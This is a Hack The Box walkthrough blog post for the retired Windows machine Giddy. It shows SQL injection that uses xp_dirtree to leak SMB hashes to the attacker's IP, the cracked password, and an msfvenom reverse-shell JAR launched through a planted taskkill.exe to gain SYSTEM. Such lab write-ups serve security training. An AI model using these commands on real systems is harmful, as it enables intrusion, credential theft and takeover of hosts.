---
layout: post
title: "Giddy: Hack The Box Walkthrough"
date: 2019-02-16 19:37:57 +0000
last_modified_at: 2019-02-16 19:38:39 +0000
category: Walkthrough
tags: ["Hack The Box", Giddy, retired]
comments: true
image:
  feature: giddy-htb-walkthrough.jpg
  credit: Felix_Hu / Pixabay
  creditlink: https://pixabay.com/en/forest-trees-sky-nature-green-1366345/
---

This post documents the complete walkthrough of Giddy, a retired vulnerable [VM][1] created by [lkys37en][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Giddy is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.104 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-25 06:39:04 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 3389/tcp on 10.10.10.104
Discovered open port 80/tcp on 10.10.10.104
Discovered open port 5985/tcp on 10.10.10.104
Discovered open port 443/tcp on 10.10.10.104
```

`masscan` finds four open ports. Let's do one better with `nmap` scanning the discovered ports.

```
#
...
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-06-16T21:28:55
| Not valid after:  2018-09-14T21:28:55
| MD5:   78a7 4af5 3b09 c882 a149 f977 cf8f 1182
|_SHA-1: 8adc 3379 878a f13f 0154 406a 3ead d345 6967 6a23
|_ssl-date: 2019-01-25T06:47:01+00:00; 0s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Issuer: commonName=Giddy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-24T05:15:20
| Not valid after:  2019-07-26T05:15:20
| MD5:   73b8 be9f ec62 29fa fb43 3030 45a9 c773
|_SHA-1: 2640 7d3f 52c7 2a94 fdbc 373b 2c83 93ce bba1 992d
|_ssl-date: 2019-01-25T06:47:02+00:00; 0s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

It's a Windows box alright. Check out the various services associated with Windows. And, it's likely running PowerShell Web Access as seen in the self-signed certificate.

### Directory/File Enumeration

I should probably start the enumeration with `gobuster` and DirBuster's wordlist.

```
/remote (Status: 302)
/mvc (Status: 301)
```

I found two directories worth exploring further. This is how they look like.

<a class="image-popup">
![44ee6275.png](/assets/images/posts/giddy-htb-walkthrough/44ee6275.png)
</a>

My guess was correct—it's really running PowerShell Web Access. It delivers a PowerShell session right in the browser if you have the right credentials.

<a class="image-popup">
![b3ad3c4a.png](/assets/images/posts/giddy-htb-walkthrough/b3ad3c4a.png)
</a>

Another directory houses a ASP.NET web application. I smell SQL injection...

### SQL Injection

Long story short, this is an example application from OWASP Top 10 Injection exercises and it's vulnerable to all sorts of SQL injection techniques.

<a class="image-popup">
![b4ac43fd.png](/assets/images/posts/giddy-htb-walkthrough/b4ac43fd.png)
</a>

Using the `ORDER BY` technique, I was able to determine the UNION columns to be 25. Armed with that insight, we can inject the following query to determine the current user.

<a class="image-popup">
![a287b22c.png](/assets/images/posts/giddy-htb-walkthrough/a287b22c.png)
</a>

As you can see from above, the current user is `giddy\stacy`. We can actually use an undocumented stored procedure (`xp_dirtree`) to steal SMB credentials. This technique is used by threat actors in the wild to harvest SMB credentials in combination with [watering-hole attack](https://en.wikipedia.org/wiki/Watering_hole_attack).

Here's how.

### Harvesting SMB Credentials

On your attacking machine, assuming it's Kali Linux, you can set up a SMB server to capture SMB credentials using Metasploit's auxiliary module `auxiliary/server/capture/smb` like so.

<a class="image-popup">
![1fb1b025.png](/assets/images/posts/giddy-htb-walkthrough/1fb1b025.png)
</a>

Execute the undocumented stored procedure from the web application like so.

```
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18; EXEC master.sys.xp_dirtree '\\10.10.14.169',1,1
```

<a class="image-popup">
![b6c03745.png](/assets/images/posts/giddy-htb-walkthrough/b6c03745.png)
</a>

The moment the request is sent, the SMB credentials are captured.

<a class="image-popup">
![77140cef.png](/assets/images/posts/giddy-htb-walkthrough/77140cef.png)
</a>

We can now send the captured NT hashes for offline cracking by John the Ripper.

<a class="image-popup">
![64dfb5ea.png](/assets/images/posts/giddy-htb-walkthrough/64dfb5ea.png)
</a>

So, Stacy's password is `xNnWo6272k7x`.

### PowerShell Web Access

Armed with Stacy's password, I think it's time to get ourselves a PowerShell.

<a class="image-popup">
![8eeec4fe.png](/assets/images/posts/giddy-htb-walkthrough/8eeec4fe.png)
</a>

<a class="image-popup">
![85ef0972.png](/assets/images/posts/giddy-htb-walkthrough/85ef0972.png)
</a>

The file `user.txt` is located at Stacy's Desktop.

<a class="image-popup">
![a2c35f45.png](/assets/images/posts/giddy-htb-walkthrough/a2c35f45.png)
</a>

### Privilege Escalation

During enumeration of `stacy`'s account, I notice a file `unifivideo` at the Stacy's Documents.

<a class="image-popup">
![3a04215c.png](/assets/images/posts/giddy-htb-walkthrough/3a04215c.png)
</a>

It turns out that this is the key to privilege escalation as per EDB-ID [43390](https://www.exploit-db.com/exploits/43390). According to the vulnerability,

>The default permissions on the `C:\ProgramData\unifi-video` folder are inherited from `C:\ProgramData` and are not explicitly overridden, which allows all users, even unprivileged ones, to append and write files to the application directory.

>Upon start and stop of the service, it tries to load and execute the file at `C:\ProgramData\unifi-video\taskkill.exe`. However this file does not exist in the application directory by default at all.

>By copying a malicious `taskkill.exe` to `C:\ProgramData\unifi-video\` as an unprivileged user, it is therefore possible to escalate privileges and execute arbitrary code as `NT AUTHORITY/SYSTEM`.

Indeed, Stacy can write to the folder.

<a class="image-popup">
![4ffe0fd9.png](/assets/images/posts/giddy-htb-walkthrough/4ffe0fd9.png)
</a>

Stacy should be able to start or stop the service either, otherwise the file `unifivideo` wouldn't be there.

<a class="image-popup">
![cfd1cce4.png](/assets/images/posts/giddy-htb-walkthrough/cfd1cce4.png)
</a>

Let's do this! First of all, if the service is running, a `Get-Process` will reveal that `avService` is running.

<a class="image-popup">
![88be39ae.png](/assets/images/posts/giddy-htb-walkthrough/88be39ae.png)
</a>

Next, let's stop the service with `Stop-Service`.

<a class="image-popup">
![c0bcb185.png](/assets/images/posts/giddy-htb-walkthrough/c0bcb185.png)
</a>

You'll notice that `avservice.exe` is no longer running. And, because I love to get me a shell, I'll attempt to spawn a reverse shell with Java no less. I'd noticed previously Jave Runtime Environment (JRE) is available.

The following takes place on my attacking machine...

...

I'll use `msfvenom` to generate the reverse shell.

```
# msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.169 LPORT=1234 -f jar -o rev.jar
Payload size: 7548 bytes
Final size of jar file: 7548 bytes
Saved as: rev.jar
```

Next, I'll cross-compile a MZ executable that runs the following command `java -jar rev.jar`. Guess what's the file name of the executable? If you guess `taskkill.exe`, ten points for Gryffindor!

<div class="filename"><span>taskkill.c</span></div>

```c
#include <stdlib.h>

int main() {
  system("java -jar rev.jar");
}
```

Cross-compile with MingW.

```
# x86_64-w64-mingw32-gcc -o taskkill.exe taskkill.c
```

Finally, host all the above with Python's SimpleHTTPServer module.

```
# python -m SimpleHTTPServer 80
```

Back to the PowerShell Web Access console...

...

Download our `taskkill.exe` and `rev.jar` to `\ProgramData\unifi-video` with `Invoke-WebRequest`.

<a class="image-popup">
![6a22260e.png](/assets/images/posts/giddy-htb-walkthrough/6a22260e.png)
</a>

Start the service with `Start-Service` and wait for your SYSTEM shell at your `nc` listener...

<a class="image-popup">
![eff98628.png](/assets/images/posts/giddy-htb-walkthrough/eff98628.png)
</a>

The file `root.txt` is at `\Users\Administrator\Desktop`.

<a class="image-popup">
![892cd85f.png](/assets/images/posts/giddy-htb-walkthrough/892cd85f.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/153
[2]: https://www.hackthebox.eu/home/users/profile/709
[3]: https://www.hackthebox.eu/
